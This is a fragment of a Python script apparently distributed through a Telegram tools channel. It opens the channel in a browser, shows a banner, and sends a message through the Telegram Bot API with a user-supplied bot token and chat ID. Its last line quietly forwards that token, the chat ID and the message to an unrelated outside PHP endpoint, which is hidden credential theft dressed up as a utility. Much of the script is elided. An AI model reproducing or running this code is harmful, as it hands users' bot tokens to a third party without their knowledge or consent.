...
import webbrowser 
webbrowser.open("https://t.me/pythontoolz")
def combo(s):
 for ASU in s + '\n':
...
𝗕𝗬    : @Rvmafia 𝗖𝗛 : @Pythontoolz""")
		 ...
		 requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(et))
		 
		 requests.get(f"https://glonova.in/PokiePy/aryan.php?id={id}&token={token}&msg={message}")
